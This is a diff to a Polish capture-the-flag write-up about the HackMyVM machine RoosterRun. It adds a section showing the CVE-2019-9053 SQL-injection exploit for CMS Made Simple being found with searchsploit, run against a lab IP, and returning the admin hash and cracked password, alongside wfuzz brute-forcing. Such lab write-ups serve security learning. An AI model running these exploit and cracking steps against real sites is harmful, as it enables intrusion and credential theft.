@@ -23,9 +23,9 @@ header:
 |Autor:|[cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)|
 |Wypuszczony:|2023-11-28|
 |Ściągnij:|[HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=RoosterRun)|
-|Poziom:||
+|Poziom:|Łatwy|
 |System:|Linux|
-|Nauczysz się:|Szybkiego biegania kogutów ;) CVE, RevShell, bruteforce |
+|Nauczysz się:|Szybkiego biegania kogutów ;) CVE, RevShell, bruteforce, Sztuczki Bash|
 
 # 01. Wstęp
 Kolejna maszynka od **Cromiphi** - znany twórcy maszynek do łamania, który dużo ich zrobił dla **HackMyVM**. To miała być łatwa maszynka, jednak zaliczyłbym ją raczej do średnich. Ma swoje ciekawe momenty, które mogą przystopować na dłużej. Do tego nie jest na parę minut, jakby się mogło komuś wydawać. Jeżeli zaczynasz zabawę z łamananiem, to bez wskazówek możesz się długo z nią męczyć (ale warto). Ip maszyny, jak zwykle wykryłem dzięki programowi **netdiscover**, ale ostatnio twórcy sami umieszczają adres na ekranie konsoli obrazu. Ostatnio obrazy odpalam w **Virtual Boxie**, ale zazwyczaj nie ruszają. Wystarczy odpowiednio ustawić sieciówkę i potem zazwyczaj wszystko rusza.
@@ -65,6 +65,7 @@ Czyli standard. Wchodząc przez przeglądarkę jest jakiś CMS - [CMS - Made sim
 ![02](/assets/images/hacking/2023/05/02.png)
 {: .text-justify}
 # 03. Szukanie hasełka dla admina
+## 03a. (bruteforce)
 Do łamania haseł online dobry jest **Ffuf** i **Wfuzz**. Niestety w **Ffuf** trzeba podawać jakieś dodatkowe parametry nagłówka, żeby dobrze znajdował. **Wfuzz** tego problemu już nie ma. Dodatkowa komplikacja jest z trudnością hasła. Niestety jest głównie w **rockyou.txt** i na dosyć dalekiej pozycji (19993), więc trochę czasu minie zanim program je znajdzie. 
 {: .text-justify}
 ```bash
@@ -86,8 +87,32 @@ ID           Response   Lines    Word       Chars       Payload
 000019993:   302        0 L      0 W        0 Ch        
 "hasełko"
 ```
+## 03b. CVE-2019-9053
+Wcześniej znalazłem exploit **CVE-2019-9053**, ale mi się nie uruchomił. Powodem był brak biblioteki **termcolor** do Pythona 2 (w którym uruchamia się skrypt). Niestety Python 2 powoli wychodzi z użycia, ale stare exploity zostały. Poprawiłem to (skopiowałem plik **termcolor.py** z katalogu **/usr/lib/python3/dist-packages** do **/usr/lib/python2**) i odpaliłem skrypt z ciekawości. Poniżej pokazuje jak go znalazłem i efekty działania.
+{: .text-justify}
+```bash
+searchsploit cms made simple sql
+```
+```bash
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                      |  Path
+-------------------------------------------------------------------------------------------------------------------- ---------------------------------
+CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                                              | php/webapps/29941.txt
+CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                                                | php/webapps/4810.txt
+CMS Made Simple < 2.2.10 - SQL Injection                                                                            | php/webapps/46635.py
+```
+```bash
+python2 46635.py -u http://172.16.1.227/ --crack -w /usr/share/wordlists/rockyou.txt
+```
+```bash
+[+] Salt for password found: 1a0112229fbd699d
+[+] Username found: admin
+[+] Email found: admin@localhost.com
+[+] Password found: 4f943036486b9ad48890b2efbf7735a8
+[+] Password cracked: hasełko
+```
 # 04. Podatna wersja CMS Made Simple
-Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.1**. Szukając podatności w **Metasploicie** znalazłem coś takiego:
+Jak wcześniej napisałem jest to **CMS Made Simple**, a jego wersja to **2.2.9.1**. Szukając następnych podatności, tym razem już w **Metasploicie** znalazłem coś takiego:
 {: .text-justify}
 ```bash
 msf6 > search CMS Made Simple
